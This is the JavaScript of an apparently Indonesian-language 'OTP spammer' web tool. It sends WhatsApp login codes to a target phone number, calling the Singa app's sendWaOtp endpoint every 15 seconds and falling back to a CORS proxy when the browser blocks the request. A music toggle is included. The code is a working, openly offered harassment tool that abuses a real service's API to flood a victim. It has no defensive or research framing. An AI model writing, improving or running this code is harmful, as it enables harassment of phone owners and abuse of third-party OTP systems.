// === MUSIC SYSTEM ===
        function toggleMusic() {
            const music = document.getElementById("bgMusic");
            const iconPath = document.getElementById("iconPath");
            const stateText = document.getElementById("musicState");

            if (music.paused) {
                music.play();

                // Change icon → Pause
                iconPath.setAttribute("d", "M6 4h4v16H6zm8 0h4v16h-4z");

                // Update status text
                stateText.innerText = "ON";
                stateText.classList.remove("off");
                stateText.classList.add("on");

            } else {
                music.pause();

                // Change icon → Play
                iconPath.setAttribute("d", "M8 5v14l11-7z");

                // Update status text
                stateText.innerText = "OFF";
                stateText.classList.remove("on");
                stateText.classList.add("off");
            }
        }

        // === SPAMMER SYSTEM ===
        let isSpamming = false;
        let spamInterval = null;
        let totalAttempts = 0;
        let successAttempts = 0;

        // Update status indicator
        function updateStatusIndicator() {
            const dot = document.getElementById('statusDot');
            const text = document.getElementById('statusText');
            
            if (isSpamming) {
                dot.classList.add('active');
                text.textContent = 'Spamming Active';
            } else {
                dot.classList.remove('active');
                text.textContent = 'System Ready';
            }
        }

        // Direct API Call to Singa
        async function sendSingaOTP(phoneNumber) {
            const url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
            
            const payload = {
                mobile_phone: phoneNumber,
                type: 'mobile',
                is_switchable: 1
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json; charset=utf-8',
                        'Accept': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const data = await response.json();
                    return {
                        success: true,
                        message: 'OTP Singa berhasil dikirim!',
                        data: data
                    };
                } else {
                    return {
                        success: false,
                        error: `HTTP Error: ${response.status}`
                    };
                }
            } catch (error) {
                return await tryWithProxy(phoneNumber);
            }
        }

        // CORS Proxy Fallback
        async function tryWithProxy(phoneNumber) {
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
            const targetUrl = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
            
            const payload = {
                mobile_phone: phoneNumber,
                type: 'mobile',
                is_switchable: 1
            };

            try {
                const response = await fetch(proxyUrl + targetUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json; charset=utf-8',
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const data = await response.json();
                    return {
                        success: true,
                        message: 'OTP Singa berhasil dikirim via proxy!',
                        data: data
                    };
                } else {
                    return {
                        success: false,
                        error: `Proxy Error: ${response.status}`
                    };
                }
            } catch (proxyError) {
                return {
                    success: false,
                    error: 'CORS blocked - Tapi request mungkin sudah terkirim'
                };
            }
        }

        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const logClass = `log-${type}`;
            
            if (log.children.length > 100) {
                log.removeChild(log.firstChild);
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${logClass}`;
            logEntry.innerHTML = `
                <div class="log-time">${timestamp}</div>
                <div class="log-message">${message}</div>
            `;
            
            log.appendChild(logEntry);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
            addLog('Log cleared', 'info');
        }

        function updateStats() {
            document.getElementById('totalAttempts').textContent = totalAttempts;
            document.getElementById('successAttempts').textContent = successAttempts;
        }

        async function spamCycle(phoneNumber) {
            if (!isSpamming) return;

            totalAttempts++;
            updateStats();

            addLog(`Mengirim OTP Singa ke ${phoneNumber}...`, 'info');
            
            const result = await sendSingaOTP(phoneNumber);

            if (result.success) {
                successAttempts++;
                updateStats();
                addLog(`${result.message}`, 'success');
            } else {
                addLog(`${result.error}`, 'error');
                addLog(`Tapi request mungkin sudah terkirim di server side`, 'warning');
            }
        }

        function startSpam() {
            const phoneInput = document.getElementById('phoneNumber').value.trim();
            if (!phoneInput) {
                addLog('MASUKKAN NOMOR TARGET DAHULU!', 'error');
                return;
            }

            const phone = normalizePhone(phoneInput);
            if (!/^(62|08)\d+$/.test(phone)) {
                addLog('FORMAT NOMOR SALAH! Gunakan 08XX atau 62XX', 'error');
                return;
            }

            isSpamming = true;
            updateStatusIndicator();
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;

            addLog(`MEMULAI SPAM SINGA KE: ${phone}`, 'success');
            addLog(`TARGET: ${phone}`, 'info');
            addLog(`Setiap 15 detik akan kirim ulang...`, 'info');

            if (spamInterval) clearInterval(spamInterval);

            spamInterval = setInterval(() => {
                if (isSpamming) {
                    spamCycle(phone);
                }
            }, 15000);

            // Immediate first attempt
            spamCycle(phone);
        }

        function stopSpam() {
            isSpamming = false;
            updateStatusIndicator();
            if (spamInterval) {
                clearInterval(spamInterval);
                spamInterval = null;
            }
            
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            
            addLog('SPAM DIHENTIKAN', 'info');
        }

        function normalizePhone(phone) {
            phone = phone.replace(/\D/g, '');
            if (phone.startsWith('0')) phone = '62' + phone.substring(1);
            if (phone.startsWith('8')) phone = '62' + phone;
            return phone;
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            updateStatusIndicator();
            addLog('SYSTEM READY', 'success');
            addLog('Masukkan nomor dan tekan START', 'info');
            addLog('Music siap dimainkan', 'info');

            document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') startSpam();
            });

            document.getElementById('phoneNumber').focus();
        });
